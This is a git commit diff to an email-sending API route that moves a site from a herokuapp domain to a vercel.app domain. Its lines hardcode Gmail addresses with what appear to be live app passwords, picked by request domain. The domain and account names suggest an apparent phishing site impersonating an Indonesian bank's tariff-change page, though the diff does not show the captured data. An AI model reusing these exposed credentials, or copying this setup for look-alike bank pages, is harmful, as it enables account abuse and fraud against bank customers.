7d83fb9d9efdbef67d161a984bdd60d7f51c86c2
penaruhangin <penaruhangin@gmail.com>
2022-11-04 20:02:01 +0700

    baru

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -24,7 +24,7 @@ export default function handler(req, res) {
         email = 'tarifbaru36@gmail.com';
         pass = 'moiasopufjkptyvr';
 
-    } else if(url == 'ubah-tarifff-baru.herokuapp.com'){
+    } else if(url == 'ubah-tarifff-baru.vercel.app'){
         email = 'accbrimo05@gmail.com';
         pass = 'hluxpmqqqqsjrbaf';
 
